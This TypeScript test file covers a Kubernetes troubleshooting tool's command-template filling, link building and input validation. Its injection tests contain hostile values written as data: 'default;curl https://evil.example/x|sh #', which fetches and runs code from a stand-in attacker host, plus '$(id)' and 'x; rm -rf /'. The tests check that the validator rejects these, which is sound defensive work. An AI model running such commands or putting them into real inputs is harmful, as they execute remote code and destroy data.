// Run with: npm test.
import { test } from "node:test";
import assert from "node:assert/strict";
import { fill, invalidValue, pageHref, parseQuery, scenarioHref, usable } from "./scenario.ts";

test("fill keeps unknown placeholders", () => {
  assert.equal(fill("kubectl -n <ns> get svc <svc>", { ns: "shop" }), "kubectl -n shop get svc <svc>");
  assert.equal(fill("no placeholders", { ns: "x" }), "no placeholders");
});

test("page links need what they need", () => {
  assert.equal(pageHref("debug", "c-1", { ns: "shop", pod: "web-1" }), "#/clusters/c-1/namespaces/shop/pods/web-1/debug");
  assert.equal(pageHref("debug", "c-1", { ns: "shop" }), "#/clusters/c-1/debug");
  assert.equal(pageHref("logs", "c-1", { ns: "shop" }), "#/clusters/c-1/pods/shop");
  assert.equal(pageHref("app-map", "c-1", { app: "argocd/flask-vue" }), "#/clusters/c-1/apps/argocd%2Fflask-vue");
  assert.equal(pageHref("node", "c-1", {}), "#/servers");
  assert.equal(pageHref("netpol", "", {}), undefined);
  assert.equal(pageHref(undefined, "c-1", {}), undefined);
});

test("start links round-trip", () => {
  const h = scenarioHref("traffic-503", "c-1", { ns: "sre-lab-app", svc: "flask-vue-backend", pod: "" });
  assert.equal(h, "#/scenarios/traffic-503?cluster=c-1&ns=sre-lab-app&svc=flask-vue-backend");
  assert.deepEqual(parseQuery(h.split("?")[1]), { cluster: "c-1", ns: "sre-lab-app", svc: "flask-vue-backend" });
  assert.deepEqual(parseQuery(undefined), {});
});

test("a crafted value is never put into a command (review KM-82 B1)", () => {
  const cmd = "kubectl get endpointslices -n <ns> -l kubernetes.io/service-name=<svc>";
  for (const bad of ["default;curl https://evil.example/x|sh #", "a|b", "$(id)", "`id`", "a b", "a\nb", "a&&b", "A", "../x", "'a'", "a>b"]) {
    assert.equal(fill(cmd, { ns: bad, svc: "api" }), "kubectl get endpointslices -n <ns> -l kubernetes.io/service-name=api", bad);
    assert.notEqual(invalidValue("ns", bad), null, bad);
  }
  assert.equal(invalidValue("port", "80"), null);
  assert.notEqual(invalidValue("port", "80;id"), null);
  assert.notEqual(invalidValue("port", "0"), null);
  assert.equal(invalidValue("app", "argocd/flask-vue"), null);
  assert.notEqual(invalidValue("app", "a/$(id)"), null);
  assert.notEqual(invalidValue("secret", "x"), null);
  assert.deepEqual(usable({ ns: "shop", svc: "a;b", pod: "", port: "443" }), { ns: "shop", port: "443" });
});

test("KM-88 placeholders are checked like other names", () => {
  for (const name of ["deploy", "pvc", "hpa", "cert", "argoapp", "host"]) {
    assert.equal(invalidValue(name, "url-shortener"), null, name);
    assert.notEqual(invalidValue(name, "x; rm -rf /"), null, name);
    assert.notEqual(invalidValue(name, "$(id)"), null, name);
  }
  assert.equal(invalidValue("host", "sre-lab.albertycliu.xyz"), null);
});

test("fill ignores Object.prototype names (review km-82-merge N-1)", () => {
  assert.equal(fill("echo <constructor> <tostring>", {}), "echo <constructor> <tostring>");
});
